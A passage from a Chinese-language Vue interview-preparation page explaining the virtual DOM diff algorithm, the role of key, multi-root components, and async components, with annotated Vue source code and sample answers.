新头索引\\n    let oldEndIdx = oldCh.length - 1 // 旧尾索引\\n    let newEndIdx = newCh.length - 1 // 新尾索引\\n    let oldStartVnode = oldCh[0] // oldVnode的第一个child\\n    let oldEndVnode = oldCh[oldEndIdx] // oldVnode的最后一个child\\n    let newStartVnode = newCh[0] // newVnode的第一个child\\n    let newEndVnode = newCh[newEndIdx] // newVnode的最后一个child\\n    let oldKeyToIdx, idxInOld, vnodeToMove, refElm\\n\\n    // removeOnly is a special flag used only by &lt;transition-group&gt;\\n    // to ensure removed elements stay in correct relative positions\\n    // during leaving transitions\\n    const canMove = !removeOnly\\n\\n    // 如果oldStartVnode和oldEndVnode重合，并且新的也都重合了，证明diff完了，循环结束\\n    while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) {\\n      // 如果oldVnode的第一个child不存在\\n      if (isUndef(oldStartVnode)) {\\n        // oldStart索引右移\\n        oldStartVnode = oldCh[++oldStartIdx] // Vnode has been moved left\\n\\n      // 如果oldVnode的最后一个child不存在\\n      } else if (isUndef(oldEndVnode)) {\\n        // oldEnd索引左移\\n        oldEndVnode = oldCh[--oldEndIdx]\\n\\n      // oldStartVnode和newStartVnode是同一个节点\\n      } else if (sameVnode(oldStartVnode, newStartVnode)) {\\n        // patch oldStartVnode和newStartVnode， 索引左移，继续循环\\n        patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue)\\n        oldStartVnode = oldCh[++oldStartIdx]\\n        newStartVnode = newCh[++newStartIdx]\\n\\n      // oldEndVnode和newEndVnode是同一个节点\\n      } else if (sameVnode(oldEndVnode, newEndVnode)) {\\n        // patch oldEndVnode和newEndVnode，索引右移，继续循环\\n        patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue)\\n        oldEndVnode = oldCh[--oldEndIdx]\\n        newEndVnode = newCh[--newEndIdx]\\n\\n      // oldStartVnode和newEndVnode是同一个节点\\n      } else if (sameVnode(oldStartVnode, newEndVnode)) { // Vnode moved right\\n        // patch oldStartVnode和newEndVnode\\n        patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue)\\n        // 如果removeOnly是false，则将oldStartVnode.eml移动到oldEndVnode.elm之后\\n        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldStartVnode.elm, nodeOps.nextSibling(oldEndVnode.elm))\\n        // oldStart索引右移，newEnd索引左移\\n        oldStartVnode = oldCh[++oldStartIdx]\\n        newEndVnode = newCh[--newEndIdx]\\n\\n      // 如果oldEndVnode和newStartVnode是同一个节点\\n      } else if (sameVnode(oldEndVnode, newStartVnode)) { // Vnode moved left\\n        // patch oldEndVnode和newStartVnode\\n        patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue)\\n        // 如果removeOnly是false，则将oldEndVnode.elm移动到oldStartVnode.elm之前\\n        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldEndVnode.elm, oldStartVnode.elm)\\n        // oldEnd索引左移，newStart索引右移\\n        oldEndVnode = oldCh[--oldEndIdx]\\n        newStartVnode = newCh[++newStartIdx]\\n\\n      // 如果都不匹配\\n      } else {\\n        if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)\\n\\n        // 尝试在oldChildren中寻找和newStartVnode的具有相同的key的Vnode\\n        idxInOld = isDef(newStartVnode.key)\\n          ? oldKeyToIdx[newStartVnode.key]\\n          : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx)\\n\\n        // 如果未找到，说明newStartVnode是一个新的节点\\n        if (isUndef(idxInOld)) { // New element\\n          // 创建一个新Vnode\\n          createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm)\\n\\n        // 如果找到了和newStartVnodej具有相同的key的Vnode，叫vnodeToMove\\n        } else {\\n          vnodeToMove = oldCh[idxInOld]\\n          /* istanbul ignore if */\\n          if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; !vnodeToMove) {\\n            warn(\\n              &#39;It seems there are duplicate keys that is causing an update error. &#39; +\\n              &#39;Make sure each v-for item has a unique key.&#39;\\n            )\\n          }\\n\\n          // 比较两个具有相同的key的新节点是否是同一个节点\\n          //不设key，newCh和oldCh只会进行头尾两端的相互比较，设key后，除了头尾两端的比较外，还会从用key生成的对象oldKeyToIdx中查找匹配的节点，所以为节点设置key可以更高效的利用dom。\\n          if (sameVnode(vnodeToMove, newStartVnode)) {\\n            // patch vnodeToMove和newStartVnode\\n            patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue)\\n            // 清除\\n            oldCh[idxInOld] = undefined\\n            // 如果removeOnly是false，则将找到的和newStartVnodej具有相同的key的Vnode，叫vnodeToMove.elm\\n            // 移动到oldStartVnode.elm之前\\n            canMove &amp;&amp; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm)\\n\\n          // 如果key相同，但是节点不相同，则创建一个新的节点\\n          } else {\\n            // same key but different element. treat as new element\\n            createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm)\\n          }\\n        }\\n\\n        // 右移\\n        newStartVnode = newCh[++newStartIdx]\\n      }\\n    }\\n</code></pre>\\n<p><strong><code>while</code>循环主要处理了以下五种情景：</strong></p>\\n<ul>\\n<li>当新老 <code>VNode</code> 节点的 <code>start</code> 相同时，直接 <code>patchVnode</code> ，同时新老 <code>VNode</code> 节点的开始索引都加 1</li>\\n<li>当新老 <code>VNode</code> 节点的 <code>end</code>相同时，同样直接 <code>patchVnode</code> ，同时新老 <code>VNode</code> 节点的结束索引都减 1</li>\\n<li>当老 <code>VNode</code> 节点的 <code>start</code> 和新 <code>VNode</code> 节点的 <code>end</code> 相同时，这时候在 <code>patchVnode</code> 后，还需要将当前真实 <code>dom</code> 节点移动到 <code>oldEndVnode</code> 的后面，同时老 <code>VNode</code> 节点开始索引加 1，新 <code>VNode</code> 节点的结束索引减 1</li>\\n<li>当老 <code>VNode</code> 节点的 <code>end</code> 和新 <code>VNode</code> 节点的 <code>start</code> 相同时，这时候在 <code>patchVnode</code> 后，还需要将当前真实 <code>dom</code> 节点移动到 <code>oldStartVnode</code> 的前面，同时老 <code>VNode</code> 节点结束索引减 1，新 <code>VNode</code> 节点的开始索引加 1</li>\\n<li>如果都不满足以上四种情形，那说明没有相同的节点可以复用，则会分为以下两种情况：\\n<ul>\\n<li>从旧的 <code>VNode</code> 为 <code>key</code> 值，对应 <code>index</code> 序列为 <code>value</code> 值的哈希表中找到与 <code>newStartVnode</code> 一致 <code>key</code> 的旧的 <code>VNode</code> 节点，再进行<code>patchVnode</code>，同时将这个真实 <code>dom</code>移动到 <code>oldStartVnode</code> 对应的真实 <code>dom</code> 的前面</li>\\n<li>调用 <code>createElm</code> 创建一个新的 <code>dom</code> 节点放到当前 <code>newStartIdx</code> 的位置</li>\\n</ul>\\n</li>\\n</ul>\\n<p><strong>小结</strong></p>\\n<ul>\\n<li>当数据发生改变时，订阅者<code>watcher</code>就会调用<code>patch</code>给真实的<code>DOM</code>打补丁</li>\\n<li>通过<code>isSameVnode</code>进行判断，相同则调用<code>patchVnode</code>方法</li>\\n<li><code>patchVnode</code>做了以下操作：\\n<ul>\\n<li>找到对应的真实<code>dom</code>，称为<code>el</code></li>\\n<li>如果都有都有文本节点且不相等，将<code>el</code>文本节点设置为<code>Vnode</code>的文本节点</li>\\n<li>如果<code>oldVnode</code>有子节点而<code>VNode</code>没有，则删除<code>el</code>子节点</li>\\n<li>如果<code>oldVnode</code>没有子节点而<code>VNode</code>有，则将<code>VNode</code>的子节点真实化后添加到<code>el</code></li>\\n<li>如果两者都有子节点，则执行<code>updateChildren</code>函数比较子节点</li>\\n</ul>\\n</li>\\n<li><code>updateChildren</code>主要做了以下操作：\\n<ul>\\n<li>设置新旧<code>VNode</code>的头尾指针</li>\\n<li>新旧头尾指针进行比较，循环向中间靠拢，根据情况调用<code>patchVnode</code>进行<code>patch</code>重复流程、调用<code>createElem</code>创建一个新节点，从哈希表寻找 <code>key</code>一致的<code>VNode</code> 节点再分情况操作</li>\\n</ul>\\n</li>\\n</ul>\\n<h3 id=\\"vue2和vue3和react三者的diff算法有什么区别\\"><a class=\\"header-anchor\\" href=\\"#vue2和vue3和react三者的diff算法有什么区别\\">#</a> Vue2和Vue3和React三者的diff算法有什么区别</h3>\\n<p>如果要严格<code>diff</code>两颗树，时间复杂度<code>O(n^3)</code>不可用，<code>react</code>把复杂度优化到了<code>O(n)</code></p>\\n<p><strong>Tree diff的优化</strong></p>\\n<ul>\\n<li>只比较同一层级，不跨级比较</li>\\n<li><code>tag</code>不同则删掉重建（不在去比较内部细节）</li>\\n<li>子节点通过<code>key</code>区分</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/01/4c213c57e4a91c38.png\\" alt=\\"\\"></p>\\n<p><strong>React diff仅右移动</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/01/8c436b7f707c2e0d.png\\" alt=\\"\\"></p>\\n<p><strong>Vue2 深度递归的方式 + 双指针的方式</strong></p>\\n<blockquote>\\n<p><code>Vue2</code>的<code>diff</code>算法是平级比较，不考虑跨级比较的情况。内部采用<code>深度递归的方式 + 双指针的方式</code>进行比较</p>\\n</blockquote>\\n<ul>\\n<li>比较过程:\\n<ul>\\n<li>先比较是否是相同节点</li>\\n<li>相同节点比较属性,并复用老节点</li>\\n<li>比较儿子节点，考虑老节点和新节点儿子的情况</li>\\n<li>优化比较：<code>头头</code>、<code>尾尾</code>、<code>头尾</code>、<code>尾头</code></li>\\n<li>比对查找进行复用</li>\\n</ul>\\n</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/01/b200d667af842b4d.png\\" alt=\\"\\"></p>\\n<p><strong>Vue3中采用最长递增子序列实现diff算法</strong></p>\\n<p><strong>Vue React为何循环时必须使用key</strong></p>\\n<ul>\\n<li><code>vdom diff</code> 算法会根据<code>key</code>判断元素是否要删除</li>\\n<li>如果匹配了<code>key</code>，则只移动元素-性能较好</li>\\n<li>未匹配<code>key</code>，则删除重建，性能较差</li>\\n</ul>\\n<h3 id=\\"既然vue通过数据劫持可以精准探测数据变化-为什么还需要虚拟dom进行diff检测差异\\"><a class=\\"header-anchor\\" href=\\"#既然vue通过数据劫持可以精准探测数据变化-为什么还需要虚拟dom进行diff检测差异\\">#</a> 既然Vue通过数据劫持可以精准探测数据变化，为什么还需要虚拟DOM进行diff检测差异</h3>\\n<ul>\\n<li>响应式数据变化，<code>Vue</code>确实可以在数据变化时，响应式系统可以立刻得知。但是如果给每个属性都添加<code>watcher</code>用于更新的话，会产生大量的<code>watcher</code>从而降低性能</li>\\n<li>而且粒度过细也得导致更新不准确的问题，所以<code>vue</code>采用了组件级的<code>watcher</code>配合<code>diff</code>来检测差异</li>\\n</ul>\\n<h3 id=\\"请说明vue中key的作用和原理-谈谈你对它的理解\\"><a class=\\"header-anchor\\" href=\\"#请说明vue中key的作用和原理-谈谈你对它的理解\\">#</a> 请说明Vue中key的作用和原理，谈谈你对它的理解</h3>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/67.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><code>key</code>是为<code>Vue</code>中的<code>VNode</code>标记的唯一<code>id</code>，在<code>patch</code>过程中通过<code>key</code>可以判断两个虚拟节点是否是相同节点，通过这个<code>key</code>，我们的<code>diff</code>操作可以更准确、更快速</li>\\n<li><code>diff</code>算法的过程中,先会进行新旧节点的首尾交叉对比,当无法匹配的时候会用新节点的<code>key</code>与旧节点进行比对,然后检出差异</li>\\n<li>尽量不要采用索引作为<code>key</code></li>\\n<li>如果不加<code>key</code>,那么<code>vue</code>会选择复用节点(Vue的就地更新策略),导致之前节点的状态被保留下来,会产生一系列的<code>bug</code></li>\\n<li><strong>更准确</strong>：因为带 <code>key</code> 就不是就地复用了，在 <code>sameNode</code> 函数 <code>a.key === b.key</code> 对比中可以避免就地复用的情况。所以会更加准确。</li>\\n<li><strong>更快速</strong>：<code>key</code>的唯一性可以被<code>Map</code>数据结构充分利用，相比于遍历查找的时间复杂度<code>O(n)</code>，<code>Map</code>的时间复杂度仅仅为<code>O(1)</code>，比遍历方式更快。</li>\\n</ul>\\n<p>源码如下：</p>\\n<pre class=\\"language-js\\"><code>function createKeyToOldIdx (children, beginIdx, endIdx) {\\n  let i, key\\n  const map = {}\\n  for (i = beginIdx; i &lt;= endIdx; ++i) {\\n    key = children[i].key\\n    if (isDef(key)) map[key] = i\\n  }\\n  return map\\n}\\n</code></pre>\\n<div class=\\"tip\\">\\n<p><strong>分析</strong></p>\\n<p>这是一道特别常见的问题，主要考查大家对虚拟<code>DOM</code>和<code>patch</code>细节的掌握程度，能够反映面试者理解层次</p>\\n<p><strong>思路分析：</strong></p>\\n<ul>\\n<li>给出结论，<code>key</code>的作用是用于优化<code>patch</code>性能</li>\\n<li><code>key</code>的必要性</li>\\n<li>实际使用方式</li>\\n<li>总结：可从源码层面描述一下<code>vue</code>如何判断两个节点是否相同</li>\\n</ul>\\n<p><strong>回答范例：</strong></p>\\n<ol>\\n<li><code>key</code>的作用主要是为了更高效的更新虚拟<code>DOM</code></li>\\n<li><code>vue</code>在<code>patch</code>过程中<strong>判断两个节点是否是相同节点是<code>key</code>是一个必要条件</strong>，渲染一组列表时，<code>key</code>往往是唯一标识，所以如果不定义<code>key</code>的话，<code>vue</code>只能认为比较的两个节点是同一个，哪怕它们实际上不是，这导致了频繁更新元素，使得整个<code>patch</code>过程比较低效，影响性能</li>\\n<li>实际使用中在渲染一组列表时<code>key</code>必须设置，而且必须是唯一标识，应该避免使用数组索引作为<code>key</code>，这可能导致一些隐蔽的<code>bug</code>；<code>vue</code>中在使用相同标签元素过渡切换时，也会使用<code>key</code>属性，其目的也是为了让<code>vue</code>可以区分它们，否则<code>vue</code>只会替换其内部属性而不会触发过渡效果</li>\\n<li>从源码中可以知道，<code>vue</code>判断两个节点是否相同时主要判断两者的<code>key</code>和<code>标签类型(如div)</code>等，因此如果不设置<code>key</code>，它的值就是<code>undefined</code>，则可能永远认为这是两个相同节点，只能去做更新操作，这造成了大量的<code>dom</code>更新操作，明显是不可取的</li>\\n</ol>\\n</div>\\n<blockquote>\\n<p>如果不使用 <code>key</code>，<code>Vue</code> 会使用一种最大限度减少动态元素并且尽可能的尝试就地修改/复用相同类型元素的算法。<code>key</code> 是为 <code>Vue</code> 中 <code>vnode</code> 的唯一标记，通过这个 <code>key</code>，我们的 <code>diff</code> 操作可以更准确、更快速</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/8c7511b8697e15ea.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>diff程可以概括为：<code>oldCh</code>和<code>newCh</code>各有两个头尾的变量S<code>tartIdx</code>和<code>EndIdx</code>，它们的<code>2</code>个变量相互比较，一共有<code>4</code>种比较方式。如果<code>4</code>种比较都没匹配，如果设置了<code>key</code>，就会用<code>key</code>进行比较，在比较的过程中，变量会往中间靠，一旦<code>StartIdx&gt;EndIdx</code>表明<code>oldCh</code>和<code>newCh</code>至少有一个已经遍历完了，就会结束比较,这四种比较方式就是<code>首</code>、<code>尾</code>、<code>旧尾新头</code>、<code>旧头新尾</code></p>\\n</blockquote>\\n<p><strong>相关代码如下</strong></p>\\n<pre class=\\"language-js\\"><code>// 判断两个vnode的标签和key是否相同 如果相同 就可以认为是同一节点就地复用\\nfunction isSameVnode(oldVnode, newVnode) {\\n  return oldVnode.tag === newVnode.tag &amp;&amp; oldVnode.key === newVnode.key;\\n}\\n\\n// 根据key来创建老的儿子的index映射表  类似 {&#39;a&#39;:0,&#39;b&#39;:1} 代表key为&#39;a&#39;的节点在第一个位置 key为&#39;b&#39;的节点在第二个位置\\nfunction makeIndexByKey(children) {\\n  let map = {};\\n  children.forEach((item, index) =&gt; {\\n    map[item.key] = index;\\n  });\\n  return map;\\n}\\n// 生成的映射表\\nlet map = makeIndexByKey(oldCh);\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>可编辑联系人列表删除第一行后，第二行输入框的未提交内容串到了新第一行；模板使用 <code>:key=&quot;index&quot;</code>，你怎么解释？</strong></p>\\n<p>索引标识的是当前位置，不是联系人本身，删除头部元素后其余数据获得了新的索引，旧 <code>DOM</code> 可能被错误地就地复用。应使用稳定且唯一的联系人 <code>id</code>，让输入框状态随对应 <code>VNode</code> 移动；数据没有稳定标识时，不能在每次渲染中临时生成。</p>\\n</li>\\n<li>\\n<p><strong>运营页每次刷新都给 500 条卡片使用 <code>Math.random()</code> 作为 <code>key</code>，页面状态和过渡效果频繁重置；根因是什么？</strong></p>\\n<p>随机值每次渲染都会变化，旧、新 <code>VNode</code> 无法被判定为同一节点，只能销毁旧节点并创建新节点。这样既丢失输入、焦点等节点状态，也无法利用复用和移动；<code>key</code> 必须在数据生命周期内稳定，而不只是当前数组中看起来唯一。</p>\\n</li>\\n<li>\\n<p><strong>同一种标签的两个提示面板切换时，产品要求每次都触发进入和离开过渡，但 <code>Vue</code> 只替换了内部文字；怎么处理？</strong></p>\\n<p>应给两个面板设置不同且稳定的 <code>key</code>，明确告诉 <code>Vue</code> 它们是不同的 <code>VNode</code>。没有区分标识时，相同标签可能被就地更新，只修改属性和内容而不发生节点替换；代价是会重建节点，因此不要用于本应保留状态的场景。</p>\\n</li>\\n<li>\\n<p><strong>一个列表已经设置业务 <code>id</code>，但线上仍出现节点复用错误；你会如何检查 <code>key</code>，而不是直接怀疑整个 <code>diff</code>？</strong></p>\\n<p>先检查兄弟节点范围内是否存在重复 <code>id</code>、空值或渲染期间变化的值，再确认节点标签类型是否符合预期。<code>Vue</code> 判断相同节点时会同时参考 <code>key</code> 和标签等条件，重复或不稳定的 <code>key</code> 会破坏映射；仅声明了 <code>key</code> 并不等于它有效。</p>\\n</li>\\n<li>\\n<p><strong>同事说“不写 <code>key</code> 更省比较，列表只改文本时肯定更快”，你会怎样回应这个选型？</strong></p>\\n<p>不写 <code>key</code> 会倾向就地修改和复用同类型节点，简单且无内部状态的静态列表可能看不出问题，但不能据此推广。带 <code>key</code> 时，首尾比较失败后可通过旧节点的键值映射定位目标，避免遍历查找并提高身份判断准确性；代价是必须维护稳定唯一标识。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_17-vue组件相关\\"><a class=\\"header-anchor\\" href=\\"#_17-vue组件相关\\">#</a> 17 Vue组件相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>通信方式按场景选：父子用 <code>props</code>/<code>emit</code>、跨层级用 <code>provide</code>/<code>inject</code>、全局状态用 <code>Pinia</code>/<code>Vuex</code>、兄弟提升到共同父级</li>\\n<li><code>v-model</code> 在组件上是 <code>:modelValue</code> + <code>@update:modelValue</code> 的语法糖（<code>Vue 2</code> 是 <code>value</code> + <code>input</code>）</li>\\n<li>插槽三种：默认插槽、具名插槽、作用域插槽（子组件把数据传给父组件的模板）</li>\\n<li>组件设计原则：<code>props</code> 超过十几个说明把&quot;结构&quot;和&quot;内容&quot;焊死了，该改成插槽让调用方决定塞什么</li>\\n<li>异步组件 <code>defineAsyncComponent</code> + <code>Suspense</code> 做懒加载和加载态</li>\\n</ul>\\n<p><strong>组件通信要按数据范围来选，父子通常用 <code>props</code> 和 <code>emit</code>，跨层级或全局状态再考虑 <code>provide</code>、<code>inject</code> 及状态库。</strong> 组件上的 <code>v-model</code> 本质是属性与更新事件的语法糖，<code>Vue 3</code> 对应 <code>modelValue</code> 和 <code>update:modelValue</code>，<code>Vue 2</code> 则是 <code>value</code> 和 <code>input</code>。需要让调用方控制内容结构时，我一般会用默认、具名或作用域插槽，避免堆出十几个 <code>props</code>。异步组件可配合 <code>defineAsyncComponent</code> 和 <code>Suspense</code> 处理懒加载及加载状态。</p>\\n</section>\\n<h3 id=\\"vue组件为什么只能有一个根元素\\"><a class=\\"header-anchor\\" href=\\"#vue组件为什么只能有一个根元素\\">#</a> Vue组件为什么只能有一个根元素</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>版本分界：<code>Vue 2</code> 的组件模板必须是单根；<code>Vue 3</code> 支持多根节点，编译后用 <code>Fragment</code> 统一承载</li>\\n<li>核心原因：渲染器需要一个稳定的返回节点作为组件子树的边界，便于挂载、更新和卸载</li>\\n<li><code>Fragment</code> 是虚拟边界，自身不产生额外 <code>DOM</code>，<code>patch</code> 时直接处理它的多个 <code>children</code></li>\\n<li>工程边界：<code>Vue 3</code> 多根组件无法自动决定非 <code>props</code> 属性落到哪个根节点，需要显式绑定 <code>$attrs</code></li>\\n</ul>\\n<p><strong><code>Vue 2</code> 组件只能有一个根元素，而 <code>Vue 3</code> 借助 <code>Fragment</code> 已经支持多个根节点。</strong> <code>Vue 2</code> 的虚拟 <code>DOM</code> 是单根树，<code>patch</code> 从根节点开始遍历，因此组件转换后的虚拟节点也需要一个明确根节点。<code>Vue 3</code> 遇到多根模板时，会创建抽象的 <code>Fragment</code>，把这些根节点放进它的 <code>children</code>，更新时再直接遍历。需要注意，多根组件无法自动判断非 <code>props</code> 属性该落到哪里，通常要显式绑定 <code>$attrs</code>。</p>\\n</section>\\n<p><code>vue3</code>中没有问题</p>\\n<pre class=\\"language-js\\"><code>Vue.createApp({\\n  components: {\\n    comp: {\\n      template: `\\n        &lt;div&gt;root1&lt;/div&gt;\\n        &lt;div&gt;root2&lt;/div&gt;\\n      `\\n    }\\n  }\\n}).mount(&#39;#app&#39;)\\n</code></pre>\\n<ol>\\n<li><code>vue2</code>中组件确实只能有一个根，但<code>vue3</code>中组件已经可以多根节点了。</li>\\n<li>之所以需要这样是因为<code>vdom</code>是一颗单根树形结构，<code>patch</code>方法在遍历的时候从根节点开始遍历，它要求只有一个根节点。组件也会转换为一个<code>vdom</code></li>\\n<li><code>vue3</code>中之所以可以写多个根节点，是因为引入了<code>Fragment</code>的概念，这是一个抽象的节点，如果发现组件是多根的，就创建一个<code>Fragment</code>节点，把多个根节点作为它的<code>children</code>。将来<code>patch</code>的时候，如果发现是一个<code>Fragment</code>节点，则直接遍历<code>children</code>创建或更新</li>\\n</ol>\\n<h3 id=\\"谈一谈对vue组件化的理解\\"><a class=\\"header-anchor\\" href=\\"#谈一谈对vue组件化的理解\\">#</a> 谈一谈对Vue组件化的理解</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>组件化是按业务职责拆分界面：每个组件封装自己的结构、状态和行为，对外只暴露稳定协议</li>\\n<li>通信协议主要是 <code>props</code> 向下、<code>emit</code> 向上和 <code>slots</code> 反转内容控制，这比直接拿子组件实例更容易维护</li>\\n<li>渲染器以组件为更新边界：哪个组件的依赖变了，就优先重跑那棵子树</li>\\n<li>代价是边界设计：拆得太粗会复用差，拆得太碎会增加通信、跳转和调试成本</li>\\n</ul>\\n<p><strong>组件化就是按职责拆分界面，让每个组件高内聚、低耦合，并通过稳定接口协作。</strong> 常见接口保留 <code>props</code>、自定义事件和插槽就够了，它们分别处理数据下发、变化通知和内容扩展，也能维持单向数据流。组件还是更新边界，依赖发生变化时只需重新渲染相关组件，因此更利于复用、测试和维护。不过也不能拆得过细，否则通信关系和调试成本会随之增加。</p>\\n</section>\\n<ul>\\n<li>组件化开发能大幅提高开发效率、测试性、复用性等</li>\\n<li>常用的组件化技术：属性、自定义事件、插槽</li>\\n<li>降低更新频率，只重新渲染变化的组件</li>\\n<li>组件的特点：高内聚、低耦合、单向数据流</li>\\n</ul>\\n<h3 id=\\"vue组件渲染和更新过程\\"><a class=\\"header-anchor\\" href=\\"#vue组件渲染和更新过程\\">#</a> Vue组件渲染和更新过程</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>首次渲染会创建组件实例，执行 <code>setup</code> / 选项初始化，再跑 <code>render</code> 得到组件子树 <code>VNode</code></li>\\n<li><code>render</code> 在响应式副作用中执行，读到的状态会被收集为该组件的渲染依赖</li>\\n<li>依赖变化后不会立刻反复刷新，而是把组件更新任务去重后放入调度队列</li>\\n<li>更新时重跑 <code>render</code>，将新旧 <code>VNode</code> 交给 <code>patch</code>，只把差异落到真实 <code>DOM</code></li>\\n</ul>\\n<p><strong>组件首次渲染会创建实例并执行初始化，再通过 <code>render</code> 生成子树 <code>VNode</code>，最后由 <code>patch</code> 挂载到真实 <code>DOM</code>。</strong> <code>render</code> 执行时会收集本组件用到的响应式依赖，状态变化后，更新任务会去重并进入调度队列。再次渲染会生成新的 <code>VNode</code>，通过 <code>diff</code> 和 <code>patchVnode</code> 对比新旧节点，只更新真正发生变化的部分。</p>\\n</section>\\n<blockquote>\\n<p>渲染组件时，会通过 <code>Vue.extend</code> 方法构建子组件的构造函数，并进行实例化。最终手动调用<code>$mount()</code> 进行挂载。更新组件时会进行 <code>patchVnode</code> 流程，核心就是<code>diff</code>算法</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/9902d8c15277fb57.png\\" alt=\\"\\"></p>\\n<h3 id=\\"异步组件是什么-使用场景有哪些\\"><a class=\\"header-anchor\\" href=\\"#异步组件是什么-使用场景有哪些\\">#</a> 异步组件是什么？使用场景有哪些？</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>异步组件是把组件定义改成按需加载的 <code>Promise</code>，首次真正渲染到它时才下载对应代码块</li>\\n<li><code>Vue 3</code> 使用 <code>defineAsyncComponent(() =&gt; import(...))</code>，可配置加载态、错误态、延迟和超时</li>\\n<li>适合弹窗、富文本、图表等低频重组件；路由懒加载是路由级分包，两者分层不同</li>\\n<li>边界是首次打开有网络等待和失败风险，首屏必需组件不应为了分包而强行异步化</li>\\n</ul>\\n<p><strong>异步组件就是把组件定义改成按需加载，只有页面真正需要它时，才通过 <code>Promise</code> 获取对应代码。</strong> 在 <code>Vue 3</code> 中通常用 <code>defineAsyncComponent</code> 配合动态 <code>import()</code>，还可以配置加载态和错误态，或结合 <code>Suspense</code> 使用。它适合弹窗、图表等不一定会展示的组件，能比路由懒加载提供更细的拆分粒度。两者并不是一回事：异步组件由 <code>Vue</code> 处理，懒加载路由则由 <code>vue-router</code> 处理。</p>\\n</section>\\n<p><strong>分析</strong></p>\\n<p>因为异步路由的存在，我们使用异步组件的次数比较少，因此还是有必要两者的不同。</p>\\n<p><strong>体验</strong></p>\\n<p>大型应用中，我们需要分割应用为更小的块，并且在需要组件时再加载它们</p>\\n<pre class=\\"language-js\\"><code>import { defineAsyncComponent } from &#39;vue&#39;\\n// defineAsyncComponent定义异步组件，返回一个包装组件。包装组件根据加载器的状态决定渲染什么内容\\nconst AsyncComp = defineAsyncComponent(() =&gt; {\\n  // 加载函数返回Promise\\n  return new Promise((resolve, reject) =&gt; {\\n    // ...可以从服务器加载组件\\n    resolve(/* loaded component */)\\n  })\\n})\\n// 借助打包工具实现ES模块动态导入\\nconst AsyncComp = defineAsyncComponent(() =&gt;\\n  import(&#39;./components/MyComponent.vue&#39;)\\n)\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>在大型应用中，我们需要分割应用为更小的块，并且在需要组件时再加载它们。</li>\\n<li>我们不仅可以在路由切换时懒加载组件，还可以在页面组件中继续使用异步组件，从而实现更细的分割粒度。</li>\\n<li>使用异步组件最简单的方式是直接给<code>defineAsyncComponent</code>指定一个<code>loader</code>函数，结合ES模块动态导入函数<code>import</code>可以快速实现。我们甚至可以指定<code>loadingComponent</code>和<code>errorComponent</code>选项从而给用户一个很好的加载反馈。另外<code>Vue3</code>中还可以结合<code>Suspense</code>组件使用异步组件。</li>\\n<li>异步组件容易和路由懒加载混淆，实际上不是一个东西。异步组件不能被用于定义懒加载路由上，处理它的是<code>vue</code>框架，处理路由组件加载的是<code>vue-router</code>。但是可以在懒加载的路由组件中使用异步组件</li>\\n</ol>\\n<h3 id=\\"为什么要使用异步组件\\"><a class=\\"header-anchor\\" href=\\"#为什么要使用异步组件\\">#</a> 为什么要使用异步组件</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>直接收益是代码分割：低频组件不进初始代码包，减少首屏下载、解析和执行成本</li>\\n<li>动态 <code>import()</code> 会给打包器创建分包边界，<code>Vue</code> 只负责在渲染时管理该 <code>Promise</code> 的状态</li>\\n<li>真正有价值的场景是“体积大且不一定打开”，而不是把每个小组件都拆成网络请求</li>\\n<li>应同时设计预加载、加载占位、错误重试和超时，否则只是把首屏卡顿转移到第一次交互</li>\\n</ul>\\n<p><strong>使用异步组件的核心目的，是把暂时用不到的组件单独打包并按需加载，避免初始文件过大。</strong> 本质上是把组件定义变成加载函数，再依赖动态 <code>import()</code> 完成代码分割；加载完成前先渲染占位节点，解析成功后触发视图重新渲染。它更适合体积较大、低频出现的组件，如果每个小组件都拆开，反而会增加加载和状态处理的复杂度。</p>\\n</section>\\n<ol>\\n<li>节省打包出的结果，异步组件分开打包，采用<code>jsonp</code>的方式进行加载，有效解决文件过大的问题。</li>\\n<li>核心就是包组件定义变成一个函数，依赖<code>import()</code> 语法，可以实现文件的分割加载。</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>components:{ \\n  AddCustomerSchedule:(resolve)=&gt;import(&quot;../components/AddCustomer&quot;) // require([]) \\n}\\n</code></pre>\\n<p>原理</p>\\n<pre class=\\"language-js\\"><code>export function ( Ctor: 